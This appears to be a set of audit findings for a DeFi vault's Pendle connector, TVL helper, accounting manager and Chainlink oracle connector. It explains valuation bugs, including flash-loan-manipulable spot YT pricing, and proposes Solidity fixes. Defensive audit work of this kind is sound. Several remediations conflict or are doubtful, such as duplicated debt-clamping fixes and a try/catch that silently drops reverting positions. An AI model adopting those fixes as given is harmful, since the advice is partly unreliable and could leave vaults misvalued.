However, `PendleLpOracleLib.getLpToAssetRate` and `PendlePtOracleLib.getPtToAssetRate` already account for the SY exchange rate (`PYIndex`) internally (for example, `PendleLpOracleLib` converts market SY reserves to asset units via `comp.totalAsset = index.syToAsset(market.totalSy)`) and return the TWAP rate of LP and PT directly in terms of the **underlying asset** (`_underlyingToken`), not in terms of `SY`.

Meanwhile, `_SY.balanceOf(address(this))` and `getYTValue(market, YTBalance)` (which queries `staticRouter.swapExactYtForSyStatic` for `netSyOut`) are denominated in `SY`.

Because `PendleConnector._getPositionTVL` adds the asset-denominated LP and PT valuations into `SYAmount` (lines 271 and 275) and then multiplies `SYAmount` by `_SY.exchangeRate() / 1e18` on line 280, the LP and PT portions of the position have the SY exchange rate applied twice (i.e. scaled by `(_SY.exchangeRate() / 1e18)^2` instead of `_SY.exchangeRate() / 1e18`).

findings.remediation:
Add the asset-denominated values returned by `getLpToAssetRate` and `getPtToAssetRate` directly to `underlyingBalance` instead of `SYAmount`, so that `_SY.exchangeRate()` is only applied to `SY`-denominated balances (`_SY.balanceOf(address(this))` and `getYTValue(market, YTBalance)`):

```solidity
            uint256 lpBalance =
                IERC20(market).balanceOf(address(this)) + pendleMarketDepositHelper.balance(market, address(this));
            if (lpBalance > 0) {
                underlyingBalance += lpBalance * IPMarket(market).getLpToAssetRate(10) / 1e18;
            }

            uint256 PTAmount = _PT.balanceOf(address(this));
            if (PTAmount > 0) underlyingBalance += PTAmount * IPMarket(market).getPtToAssetRate(10) / 1e18;

            uint256 YTBalance = _YT.balanceOf(address(this));
            if (YTBalance > 0) SYAmount += getYTValue(market, YTBalance);

            if (SYAmount > 0) underlyingBalance += SYAmount * _SY.exchangeRate() / 1e18;
```

Replace the hardcoded 10-second TWAP duration with a configurable, sufficiently long TWAP window (e.g., 1800 seconds), price YT via the Pendle PT TWAP oracle identity ($1\text{ YT} + 1\text{ PT} = 1\text{ Asset}$ scaled by `pyIndex`) instead of a spot AMM swap simulation, and use consistent `Asset`-denominated or `SY`-denominated rates (`getLpToSyRate` / `getPtToSyRate` or direct asset conversion) so `_SY.exchangeRate()` is not applied inconsistently.

```solidity
            uint32 twapDuration = 1800; // Use a manipulation-resistant TWAP window (e.g., 30 minutes)
            uint256 syExchangeRate = _SY.exchangeRate();
            if (SYAmount > 0) {
                underlyingBalance += (SYAmount * syExchangeRate) / 1e18;
            }

            uint256 lpBalance =
                IERC20(market).balanceOf(address(this)) + pendleMarketDepositHelper.balance(market, address(this));
            if (lpBalance > 0) {
                underlyingBalance += (lpBalance * IPMarket(market).getLpToAssetRate(twapDuration)) / 1e18;
            }

            uint256 ptRateToAsset = IPMarket(market).getPtToAssetRate(twapDuration);
            uint256 PTAmount = _PT.balanceOf(address(this));
            if (PTAmount > 0) {
                underlyingBalance += (PTAmount * ptRateToAsset) / 1e18;
            }

            uint256 YTBalance = _YT.balanceOf(address(this));
            if (YTBalance > 0 && ptRateToAsset < 1e18) {
                underlyingBalance += (YTBalance * (1e18 - ptRateToAsset)) / 1e18;
            }
```

findings.technical_details:
In `PendleConnector._getPositionTVL`, the connector aggregates the value of its Standardized Yield (`_SY`), Liquidity Provider (`LP`), Principal Token (`_PT`), and Yield Token (`_YT`) holdings to compute the position's Total Value Locked (TVL), which feeds directly into `AccountingManager.TVL()`.

While LP and PT holdings are valued using Pendle's Time-Weighted Average Price (TWAP) oracle libraries (`PendleLpOracleLib.getLpToAssetRate` and `PendlePtOracleLib.getPtToAssetRate`), YT holdings are valued on lines 293–295 via `getYTValue`:

```solidity
function getYTValue(address market, uint256 balance) public view returns (uint256) {
    (uint256 netSyOut,,,,,,) = staticRouter.swapExactYtForSyStatic(market, balance);
    return netSyOut;
}
```

`IPendleStaticRouter.swapExactYtForSyStatic(market, balance)` simulates an immediate on-chain market swap of `balance` YT for SY against the Pendle market's current spot state (`totalPt`, `totalSy`, and `lastLnImpliedRate`). In Pendle's AMM design, swapping YT for SY flashes PT from the market, pairs it with the user's YT to redeem SY from the Yield Contract, and swaps a portion of that SY back into the market for PT to repay the flash swap.

Relying on `swapExactYtForSyStatic` for portfolio valuation introduces severe market-based valuation flaws:

1. **Transient Market-State Manipulation:** Because `swapExactYtForSyStatic` reads the instantaneous pool state (`MarketState`) rather than a TWAP observation window, an attacker can flash-borrow assets and execute a large PT/SY swap in the Pendle market within the same transaction. This transiently skews the market's PT/SY proportion and implied yield rate, artificially inflating or deflating `netSyOut` and thus manipulating `AccountingManager.TVL()`.
2. **Inconsistent Pricing Across Position Components:** When the connector mints PT and YT from SY via `mintPTAndYT`, 1 unit of underlying asset (adjusted by `pyIndex`) is split into 1 PT + 1 YT. Valuing PT via the TWAP oracle (`getPtToAssetRate`) while valuing YT via a spot liquidation swap (`swapExactYtForSyStatic`) breaks the fundamental parity $\text{Price}_{\text{PT}} + \text{Price}_{\text{YT}} = 1 \text{ Asset}$, causing immediate TVL discrepancies upon minting or trading.
3. **Liquidity-Sensitive Pricing and DoS:** Simulating a single swap of the entire `balance` deducts AMM swap fees and incurs nonlinear slippage proportional to position size. Furthermore, if the connector's YT balance exceeds what the pool's liquidity can absorb (`Errors.MarketProportionTooHigh` or `Errors.MarketInsufficientPtForTrade`), or if the market reaches maturity (`Errors.MarketExpired` when `block.timestamp >= market.expiry`), `swapExactYtForSyStatic` reverts, bricking `AccountingManager.TVL()`.

findings.remediation:
Replace the `staticRouter.swapExactYtForSyStatic` call with a TWAP-based valuation derived from Pendle's PT oracle library (`1 - ptRate`, converted to SY using the current `pyIndex`), matching Pendle's official `PendlePtOracleLib` valuation model and ensuring consistency with PT and LP pricing:

```solidity
    function getYTValue(address market, uint256 balance) public view returns (uint256) {
        uint256 ptToAssetRate = IPMarket(market).getPtToAssetRate(10);
        if (ptToAssetRate >= 1e18) {
            return 0;
        }
        (IPStandardizedYield _SY,, IPYieldToken _YT) = IPMarket(market).readTokens();
        uint256 pyIndex = Math.max(_SY.exchangeRate(), _YT.pyIndexStored());
        uint256 ytToAssetRate = 1e18 - ptToAssetRate;
        return (balance * ytToAssetRate) / pyIndex;
    }
```

Enforce a maximum staleness check on `positions[i].positionTimestamp` inside `TVLHelper.getTVL` for all time-sensitive positions (where `positionTimestamp != type(uint256).max`), reverting if any asynchronous position valuation is older than the allowed heartbeat:

```solidity
library TVLHelper {
    uint256 public constant MAX_UPDATE_DELAY = 1 hours;

    error TVLHelper_StalePosition(bytes32 positionId, uint256 positionTimestamp, uint256 currentTimestamp);

    function getTVL(uint256 vaultId, PositionRegistry registry, address baseToken) public view returns (uint256) {
        uint256 totalTVL;
        uint256 totalDebt;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            if (
                positions[i].positionTimestamp != type(uint256).max
                    && (
                        positions[i].positionTimestamp > block.timestamp
                            || block.timestamp - positions[i].positionTimestamp > MAX_UPDATE_DELAY
                    )
            ) {
                revert TVLHelper_StalePosition(
                    positions[i].positionId, positions[i].positionTimestamp, block.timestamp
                );
            }
            uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken);
            bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
            if (isPositionDebt) {
                totalDebt += tvl;
            } else {
                totalTVL += tvl;
            }
        }
        if (totalTVL < totalDebt) {
            return 0;
        }
        return (totalTVL - totalDebt);
    }
```

findings.technical_details:
In `contracts/helpers/TVLHelper.sol`, `getTVL` computes a vault's Total Value Locked by retrieving all holding positions from `PositionRegistry.getHoldingPositions(vaultId)` and iterating over each entry:

```solidity
HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
for (uint256 i = 0; i < positions.length; i++) {
    if (positions[i].calculatorConnector == address(0)) {
        continue;
    }
    uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken);
    bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
    if (isPositionDebt) {
        totalDebt += tvl;
    } else {
        totalTVL += tvl;
    }
}
```

At line 22, `IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken)` is invoked directly without error handling (`try/catch`) or fallback valuation logic. Each connector's `getPositionTVL` implementation typically queries external protocol state and converts non-base token amounts into `baseToken` units via `NoyaValueOracle.getValue`, which reverts with `NoyaOracle_PriceOracleUnavailable` (or propagates reverts from underlying Chainlink/Uniswap feeds) whenever a route or oracle feed is missing, stale, or paused.

Furthermore, `PositionRegistry.removeTrustedPosition` prevents removing a `trustedPositionsBP` entry while any holding position still references its `positionId` (`CannotRemovePosition`), and `PositionRegistry.updateHoldingPosition` can only be called by an enabled `msg.sender` connector (`ownerConnector`) that holds the position. Consequently, if a single position's `calculatorConnector` or underlying token oracle enters a reverting state, `TVLHelper.getTVL` unconditionally reverts on every call.

Because `AccountingManager.TVL()`, `AccountingManager.totalAssets()`, `AccountingManager.deposit()`, `AccountingManager.getProfit()`, and `OmnichainManagerNormalChain.updateTVLInfo()` all call `TVLHelper.getTVL`, a single broken or unavailable valuation dependency halts core vault accounting and user operations.

findings.remediation:
Wrap the external `getPositionTVL` call in a `try/catch` block or provide a safe fallback mechanism (such as caching the last known valid position TVL and timestamp, or allowing emergency bypass of a faulty position while pausing share-sensitive operations) so that a single malfunctioning connector or oracle can be isolated and remediated without bricking all TVL queries.

```solidity
    function getTVL(uint256 vaultId, PositionRegistry registry, address baseToken) public view returns (uint256) {
        uint256 totalTVL;
        uint256 totalDebt;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            try IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken) returns (
                uint256 tvl
            ) {
                bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
                if (isPositionDebt) {
                    totalDebt += tvl;
                } else {
                    totalTVL += tvl;
                }
            } catch {
                continue;
            }
        }
        if (totalTVL < totalDebt) {
            return 0;
        }
        return (totalTVL - totalDebt);
    }
```

findings.technical_details:
In `contracts/helpers/TVLHelper.sol`, `getTVL` aggregates asset and debt positions across the vault's `holdingPositions` stored in `PositionRegistry`:

```solidity
        if (totalTVL < totalDebt) {
            return 0;
        }
        return (totalTVL - totalDebt);
```

However, a vault's total assets are split between positions tracked in `PositionRegistry` (evaluated via `TVLHelper.getTVL`) and `baseToken` held directly by `AccountingManager`. In `contracts/accountingManager/AccountingManager.sol`, the vault's overall `TVL()` is computed as:

```solidity
    function TVL() public view returns (uint256) {
        return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
            - depositQueue.totalAWFDeposit;
    }
```

Because `TVLHelper.getTVL` floors `(totalTVL - totalDebt)` at `0` before `AccountingManager.TVL()` adds `baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit`, any excess debt (`totalDebt - totalTVL`) from `holdingPositions` is completely ignored against the `baseToken` balance held in `AccountingManager`.

For example, if a connector takes on a debt position (or flash loan / leverage position) and transfers the borrowed `baseToken` to `AccountingManager` (such as when retrieving tokens for withdrawals or holding idle `baseToken` in `AccountingManager`), or if non-baseToken collateral in connectors depreciates below `totalDebt` while `AccountingManager` holds `baseToken` reserves:
- `TVLHelper.getTVL` sees `totalTVL < totalDebt` and returns `0`.
- `AccountingManager.TVL()` returns `0 + baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit`.
- The excess liability `totalDebt - totalTVL` vanishes from the calculation, artificially inflating `TVL()`, `totalAssets()` (used for ERC4626 share pricing on deposits and withdrawals), and `getProfit()` (used for performance fee calculations).

findings.remediation:
Return a signed net value (`int256`) or both `totalTVL` and `totalDebt` from `TVLHelper.getTVL` (or pass the `AccountingManager` unqueued `baseToken` balance into `TVLHelper.getTVL`) so that `totalDebt` is netted against the entire vault's assets before clamping to zero.

```solidity
    function getTVL(uint256 vaultId, PositionRegistry registry, address baseToken) public view returns (uint256) {
        uint256 totalTVL;
        uint256 totalDebt;
        (address accountingManager,) = registry.getVaultAddresses(vaultId);
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken);
            bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
            if (isPositionDebt) {
                totalDebt += tvl;
            } else {
                totalTVL += tvl;
            }
        }
        require(totalTVL >= totalDebt, "TVLHelper: Negative position TVL");
        return (totalTVL - totalDebt);
    }
```

Alternatively, return `(uint256 totalTVL, uint256 totalDebt)` or `int256` from `TVLHelper.getTVL` and apply the zero-floor only after adding `baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit` in `AccountingManager.TVL()`.

findings.technical_details:
In `AccountingManager.sol`, withdrawal processing follows a multi-step lifecycle:
1. `calculateWithdrawShares` computes the base token value of queued shares and accumulates the obligation in `currentWithdrawGroup.totalCBAmount`.
2. `startCurrentWithdrawGroup` marks `currentWithdrawGroup.isStarted = true`.
3. `retrieveTokensForWithdraw` pulls funds from active connectors into `AccountingManager` and increments `amountAskedForWithdraw` by each `retrieveData[i].withdrawAmount`. It enforces that `amountAskedForWithdraw_temp <= neededAssetsForWithdraw()`.
4. `fulfillCurrentWithdrawGroup` finalizes the withdrawal group, checking:
   ```solidity
   uint256 neededAssets = neededAssetsForWithdraw();
   if (neededAssets != 0 && amountAskedForWithdraw != currentWithdrawGroup.totalCBAmount) {
       revert NoyaAccounting_NOT_READY_TO_FULFILL();
   }
   ```

However, `neededAssetsForWithdraw` (lines 616–625) computes the remaining needed assets as:
```solidity
uint256 availableAssets = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
if (
    currentWithdrawGroup.isStarted == false || currentWithdrawGroup.isFullfilled == true
        || availableAssets >= currentWithdrawGroup.totalCBAmount
) {
    return 0;
}
return currentWithdrawGroup.totalCBAmount - availableAssets;
```

This creates a direct accounting mismatch between `availableAssets` (actual tokens held in `AccountingManager`), `amountAskedForWithdraw` (nominal amount requested from connectors before slippage), and `currentWithdrawGroup.totalCBAmount`:

1. **Pre-existing Idle Balance + Retrieval Slippage Causes Fulfillment Deadlock:**
   If `AccountingManager` already holds idle `baseToken` (`availableAssets > 0`) when a withdrawal group starts, `neededAssetsForWithdraw()` returns `currentWithdrawGroup.totalCBAmount - availableAssets`. Because `retrieveTokensForWithdraw` reverts if `amountAskedForWithdraw_temp > neededAssets`, the manager can request at most `currentWithdrawGroup.totalCBAmount - availableAssets` from connectors, meaning `amountAskedForWithdraw` can never reach `currentWithdrawGroup.totalCBAmount` in that retrieval. If the connector transfer experiences even 1 wei of slippage (`amount < retrieveData[i].withdrawAmount`), the post-retrieval `availableAssets` remains strictly less than `currentWithdrawGroup.totalCBAmount`. Consequently, `neededAssetsForWithdraw()` remains non-zero while `amountAskedForWithdraw != currentWithdrawGroup.totalCBAmount`, causing `fulfillCurrentWithdrawGroup()` to revert with `NoyaAccounting_NOT_READY_TO_FULFILL`.

2. **Slippage Across Retrievals Allows Excess Withdrawals from Connectors or Blocks Fulfillment:**
   When a connector retrieval incurs slippage (so `amount < withdrawAmount`), `availableAssets` increases by `amount` rather than `withdrawAmount`. Because `neededAssetsForWithdraw()` only deducts `availableAssets` from `currentWithdrawGroup.totalCBAmount` and ignores `amountAskedForWithdraw`, `neededAssetsForWithdraw()` remains positive by the slippage shortfall even after the full `totalCBAmount` has been requested (or in multi-batch retrievals). If the manager retrieves the reported `neededAssetsForWithdraw()` shortfall from connectors, two issues occur:
   - The withdrawal group's slippage is socialized onto remaining vault shareholders by pulling extra assets from connectors instead of reducing `currentWithdrawGroup.totalABAmount`.
   - `amountAskedForWithdraw` exceeds `currentWithdrawGroup.totalCBAmount`, so if any slippage remains (`availableAssets < currentWithdrawGroup.totalCBAmount`), `amountAskedForWithdraw != currentWithdrawGroup.totalCBAmount` and `neededAssets != 0` both hold, permanently blocking `fulfillCurrentWithdrawGroup()`.

findings.remediation:
Track the pre-existing idle balance dedicated to the withdrawal group or account for `amountAskedForWithdraw` in `neededAssetsForWithdraw()` so that already-requested connector withdrawals (including any slippage) are not requested a second time, and ensure `neededAssetsForWithdraw()` returns `0` once the required retrieval amount has been asked for.

```solidity
    function neededAssetsForWithdraw() public view returns (uint256) {
        uint256 availableAssets = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
        if ( // check if the withdraw group is fullfilled
            currentWithdrawGroup.isStarted == false || currentWithdrawGroup.isFullfilled == true
                || availableAssets >= currentWithdrawGroup.totalCBAmount
                || amountAskedForWithdraw >= currentWithdrawGroup.totalCBAmount
        ) {
            return 0;
        }
        uint256 neededByBalance = currentWithdrawGroup.totalCBAmount - availableAssets;
        uint256 neededByAsked = currentWithdrawGroup.totalCBAmount - amountAskedForWithdraw;
        return neededByBalance < neededByAsked ? neededByBalance : neededByAsked;
    }
```

findings.technical_details:
In `contracts/helpers/TVLHelper.sol`, `getTVL` iterates through all holding positions registered for a vault in `PositionRegistry`, accumulating asset values into `totalTVL` and debt position values into `totalDebt`:

```solidity
if (totalTVL < totalDebt) {
    return 0;
}
return (totalTVL - totalDebt);
```

In `contracts/accountingManager/AccountingManager.sol`, the vault's overall `TVL()` is computed by combining the holding positions' TVL with the idle `baseToken` balance held directly by `AccountingManager` (excluding pending deposits in `depositQueue.totalAWFDeposit`):

```solidity
function TVL() public view returns (uint256) {
    return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
        - depositQueue.totalAWFDeposit;
}
```

Because `TVLHelper.getTVL` clamps the net position value to `0` when `totalTVL < totalDebt`, the excess debt (`totalDebt - totalTVL`) is truncated instead of being represented or netted against the rest of the vault's balance sheet.

For example, when a connector borrows `baseToken` against collateral (recording a debt position) and transfers `baseToken` to `AccountingManager` (e.g., during `retrieveTokensForWithdraw` to service withdrawals), or when debt interest accrues while funds sit idle in `AccountingManager`, `totalDebt` in the holding positions can exceed `totalTVL` in the holding positions while `AccountingManager` holds significant `baseToken`. Because `TVLHelper.getTVL` returns `0` instead of accounting for the net deficit `(totalDebt - totalTVL)`, `AccountingManager.TVL()` evaluates to `baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit`, completely omitting the unpaid net debt and inflating share price and profit calculations.

findings.remediation:
Return a signed net value (or both `totalTVL` and `totalDebt`, or include `AccountingManager`'s net idle `baseToken` balance inside `TVLHelper.getTVL` before clamping at zero) so that holding position deficits are netted against idle vault assets before flooring at zero.

For example, if `TVLHelper.getTVL` accounts for the vault's idle `baseToken` balance directly or returns a signed `int256`, the deficit is properly netted. Alternatively, include `AccountingManager`'s available `baseToken` in `totalTVL` before comparing against `totalDebt`:

```solidity
    function getTVL(uint256 vaultId, PositionRegistry registry, address baseToken) public view returns (int256) {
        uint256 totalTVL;
        uint256 totalDebt;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken);
            bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
            if (isPositionDebt) {
                totalDebt += tvl;
            } else {
                totalTVL += tvl;
            }
        }
        return int256(totalTVL) - int256(totalDebt);
    }
```

Remove the redundant addition of `baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit` from `AccountingManager.TVL()`, since `TVLHelper.getTVL` already accounts for it through `AccountingManager.getPositionTVL`:

```solidity
    function TVL() public view returns (uint256) {
        return TVLHelper.getTVL(vaultId, registry, address(baseToken));
    }
```

findings.technical_details:
`AccountingManager` inherits from OpenZeppelin's `ERC4626` to manage vault shares. In `ERC4626`, share and asset conversions (`convertToShares`, `convertToAssets`, `previewDeposit`, `previewMint`, `previewWithdraw`, `previewRedeem`) rely on the virtual `totalAssets()` function:

```solidity
function totalAssets() public view virtual returns (uint256) {
    return _asset.balanceOf(address(this));
}
```

In `AccountingManager`, user deposits are first held in the `AccountingManager` contract and tracked in `depositQueue.totalAWFDeposit` until `executeDeposit()` mints the shares and transfers the `baseToken` to active connectors. Therefore, the actual Total Value Locked (TVL) backing the existing shares is calculated in `AccountingManager.TVL()` (lines 627–630):

```solidity
function TVL() public view returns (uint256) {
    return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
        - depositQueue.totalAWFDeposit;
}
```

However, `AccountingManager` defines `TVL()` as a standalone function instead of overriding `totalAssets()` (or overriding `totalAssets()` to return `TVL()`). 

When `calculateWithdrawShares()` (line 344) or any other share calculation calls `previewRedeem(data.shares)` (or `previewDeposit`), `ERC4626` uses `totalAssets()`, which evaluates to `_asset.balanceOf(address(this))` (i.e., `baseToken.balanceOf(address(this))`). This introduces two severe valuation distortions:
1. **Connector valuations are completely omitted:** All assets deployed into connectors (`TVLHelper.getTVL(...)`) are excluded from `totalAssets()`. When most or all vault funds are deployed in connectors, `totalAssets()` is near zero, causing `previewRedeem` to value shares at nearly zero assets.
2. **Transient token-balance distortion from pending deposits and direct transfers:** `totalAssets()` includes `depositQueue.totalAWFDeposit` (tokens deposited by users waiting in the deposit queue whose shares have not yet been minted). This artificially inflates `totalAssets()` whenever deposits are queued, and allows anyone to distort share calculations by queuing deposits or transferring `baseToken` to `AccountingManager`.

findings.remediation:
Override `totalAssets()` in `AccountingManager` so that it returns `TVL()`.

```solidity
    function totalAssets() public view override returns (uint256) {
        return TVL();
    }

    function TVL() public view returns (uint256) {
        return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
            - depositQueue.totalAWFDeposit;
    }
```

findings.technical_details:
In `AccountingManager.sol`, `getPositionTVL` computes the TVL of a token holding position (`positionTypeId == 0`) as follows:

```solidity
PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
if (p.positionTypeId == 0) {
    address token = abi.decode(p.data, (address));
    uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)));
    return _getValue(token, base, amount);
}
return 0;
```

When a connector registers a holding position in `PositionRegistry.updateHoldingPosition`, the registry authenticates `msg.sender` as an active connector, records `msg.sender` in `HoldingPI.ownerConnector`, and stores the caller-supplied `_data` payload in `HoldingPI.data` without inspecting its contents:

```solidity
bytes32 holdingPositionId = keccak256(abi.encode(msg.sender, _positionId, _data));
...
vault.holdingPositions.push(
    HoldingPI(
        vaults[vaultId].trustedPositionsBP[_positionId].calculatorConnector,
        msg.sender,
        _positionId,
        d,
        AD,
        type(uint256).max
    )
);
```

`AccountingManager.getPositionTVL` fails to enforce position provenance and holder binding in three interconnected ways:

1. **Unbound holder attribution (`position.data` vs. `position.ownerConnector`)**: Line 636 queries `IERC20(token).balanceOf(abi.decode(position.data, (address)))` instead of verifying that the decoded holder address equals the authenticated `position.ownerConnector` (and is not `address(this)`, whose `baseToken` balance is already added separately in `AccountingManager.TVL()`). Because `holdingPositionId` is keyed by `keccak256(abi.encode(msg.sender, _positionId, _data))`, multiple connectors (or a single connector passing different `_data` or another contract's address such as `AccountingManager` or another connector) can create distinct holding positions that point to the same token holder address, causing `TVLHelper.getTVL` to count the same token balance multiple times.
2. **Missing blueprint lifecycle and calculator binding (`p.isEnabled` and `p.calculatorConnector`)**: Line 633 fetches `p` from `registry.getPositionBP(vaultId, position.positionId)`, which returns a zero-initialized `PositionBP` struct if `positionId` does not exist or was removed. Because `p.positionTypeId` defaults to `0`, an unenabled or non-existent `PositionBP` (or one registered for a different `calculatorConnector` that also uses `positionTypeId == 0`) satisfies `if (p.positionTypeId == 0)` at line 634.
3. **Missing holding position registry membership verification**: `getPositionTVL` does not verify via `registry.getHoldingPositionIndex(vaultId, position.positionId, position.ownerConnector, position.data)` that the supplied `HoldingPI` struct corresponds to an active holding position in the vault registry.

findings.remediation:
Validate that the `PositionBP` is enabled and belongs to `AccountingManager`, verify that the decoded holder address matches `position.ownerConnector` (and is not `address(this)`), and ensure the holding position is active in `PositionRegistry`:

```solidity
    function getPositionTVL(HoldingPI memory position, address base) public view returns (uint256) {
        PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
        if (
            p.isEnabled && p.calculatorConnector == address(this) && position.calculatorConnector == address(this)
                && p.positionTypeId == 0
        ) {
            address holder = abi.decode(position.data, (address));
            if (
                holder != position.ownerConnector || holder == address(this)
                    || registry.getHoldingPositionIndex(vaultId, position.positionId, position.ownerConnector, position.data)
                        == 0
            ) {
                return 0;
            }
            address token = abi.decode(p.data, (address));
            uint256 amount = IERC20(token).balanceOf(holder);
            return _getValue(token, base, amount);
        }
        return 0;
    }
```

findings.technical_details:
In `AccountingManager.sol`, `getPositionTVL` (lines 633–639) computes the value of a `positionTypeId == 0` token holding in terms of `base` (`baseToken`) by calling `_getValue(token, base, amount)`, which delegates to `valueOracle.getValue(token, base, amount)` and down to `ChainlinkOracleConnector.getValue(asset, baseToken, amount)`.

`AccountingManager.TVL()` (lines 627–629) sums the TVL returned by `TVLHelper.getTVL(vaultId, registry, address(baseToken))` directly with `baseToken.balanceOf(address(this))`, requiring `getPositionTVL` to return amounts denominated in `baseToken` decimals ($10^{d_{\text{base}}}$).

However, `ChainlinkOracleConnector.getValue` (lines 98–102) and `getValueFromChainlinkFeed` (lines 115–135) only query a single `decimalsSource`:
```solidity
address decimalsSource = isPrimaryInverse ? baseToken : asset;
decimalsSource = decimalsSource == ETH || decimalsSource == USD ? primarySource : decimalsSource;
return getValueFromChainlinkFeed(
    AggregatorV3Interface(primarySource), amount, getTokenDecimals(decimalsSource), isPrimaryInverse
);
```
And `getValueFromChainlinkFeed` computes:
```solidity
if (isInverse) {
    return (amountIn * sourceTokenUnit) / uintprice;
}
return (amountIn * uintprice) / (sourceTokenUnit);
```

This scaling logic is flawed in both directions whenever the token decimals and Chainlink aggregator decimals ($d_{\text{feed}}$) do not coincidentally cancel out:

1. **Direct feed (`isPrimaryInverse == false`, feed quotes `asset / baseToken`):**
   - When `asset` is an ERC20 token, `sourceTokenUnit` is $10^{d_{\text{asset}}}$. The calculation `(amountIn * uintprice) / 10^{d_{\text{asset}}}` cancels $10^{d_{\text{asset}}}$ and returns a value scaled by $10^{d_{\text{feed}}}$ (the Chainlink feed's decimals) instead of $10^{d_{\text{base}}}$ (`baseToken` decimals). For example, valuing `WETH` (18 decimals) or `WBTC` (8 decimals) in `USDC` (6 decimals) using an 8-decimal or 18-decimal feed inflates the returned `USDC` value by $10^2$ or $10^{12}$.
   - When `asset` is `ETH` or `USD`, `sourceTokenUnit` is $10^{d_{\text{feed}}}$. The calculation `(amountIn * uintprice) / 10^{d_{\text{feed}}}` cancels $10^{d_{\text{feed}}}$ and leaves the result in `amountIn`'s decimals instead of $10^{d_{\text{base}}}$.

2. **Inverse feed (`isPrimaryInverse == true`, feed quotes `baseToken / asset`):**
   - When `baseToken` is an ERC20 token, `sourceTokenUnit` is $10^{d_{\text{base}}}$. The calculation `(amountIn * 10^{d_{\text{base}}}) / uintprice` yields a value with $d_{\text{asset}} + d_{\text{base}} - d_{\text{feed}}$ decimals instead of $d_{\text{base}}$ decimals whenever $d_{\text{asset}} \neq d_{\text{feed}}$. For example, valuing `USDC` (6 decimals) in `WETH` (18 decimals) using the inverse of an 8-decimal `WETH/USDC` feed undervalues the position by a factor of $10^2$, or valuing `WETH` (18 decimals) in `USDC` (6 decimals) using the inverse of an 18-decimal `USDC/ETH` feed (`USDC/WETH`) inflates the result when `d_asset != d_feed`.
   - When `baseToken` is `ETH` or `USD`, `sourceTokenUnit` is $10^{d_{\text{feed}}}$, yielding a result in $d_{\text{asset}}$ decimals instead of a consistent `ETH` (18) or `USD` (8) unit across hops.

findings.remediation:
Update `ChainlinkOracleConnector` so that `getTokenDecimals` defines explicit decimal units for `ETH` (18 decimals) and `USD` (8 decimals), and normalize across `asset` decimals, `baseToken` decimals, and `source.decimals()` in `getValue` / `getValueFromChainlinkFeed`:

```solidity
    function getValue(address asset, address baseToken, uint256 amount) public view returns (uint256) {
        if (asset == baseToken) {
            return amount;
        }

        (address primarySource, bool isPrimaryInverse) = getSourceOfAsset(asset, baseToken);
        if (primarySource == address(0)) {
            revert NoyaChainlinkOracle_PRICE_ORACLE_UNAVAILABLE(asset, baseToken, primarySource);
        }
        return getValueFromChainlinkFeed(
            AggregatorV3Interface(primarySource),
            amount,
            getTokenDecimals(asset),
            getTokenDecimals(baseToken),
            isPrimaryInverse
        );
    }

    function getValueFromChainlinkFeed(
        AggregatorV3Interface source,
        uint256 amountIn,
        uint256 assetTokenUnit,
        uint256 baseTokenUnit,
        bool isInverse
    ) public view returns (uint256) {
        int256 price;
        uint256 updatedAt;
        (, price,, updatedAt,) = source.latestRoundData();
        uint256 uintprice = uint256(price);
        if (block.timestamp - updatedAt > chainlinkPriceAgeThreshold) {
            revert NoyaChainlinkOracle_DATA_OUT_OF_DATE();
        }
        if (price <= 0) {
            revert NoyaChainlinkOracle_PRICE_ORACLE_UNAVAILABLE(address(source), address(0), address(0));
        }
        uint256 feedUnit = 10 ** uint256(source.decimals());
        if (isInverse) {
            return (amountIn * feedUnit * baseTokenUnit) / (uintprice * assetTokenUnit);
        }
        return (amountIn * uintprice * baseTokenUnit) / (feedUnit * assetTokenUnit);
    }

    function getTokenDecimals(address token) public view returns (uint256) {
        if (token == ETH) {
            return 10 ** 18;
        }
        if (token == USD) {
            return 10 ** 8;
        }
        uint256 decimals = IERC20Metadata(token).decimals();
        return 10 ** decimals;
    }
```

findings.technical_details:
